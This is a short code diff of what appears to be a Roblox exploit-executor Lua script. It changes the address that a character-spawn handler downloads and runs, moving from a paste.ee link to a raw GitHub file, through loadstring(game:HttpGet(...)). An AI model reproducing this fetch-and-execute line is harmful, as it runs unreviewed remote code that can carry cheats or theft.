@@ -170,7 +170,7 @@ end
 local function onCharacterAdded(character)
     wait(getgenv().Time)
     
-    loadstring(game:HttpGet("https://paste.ee/r/0uIxM"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Nwepnet/stuffido/refs/heads/main/Aizen",true))()
     
     local endTime = tick() + 6
     while tick() < endTime do
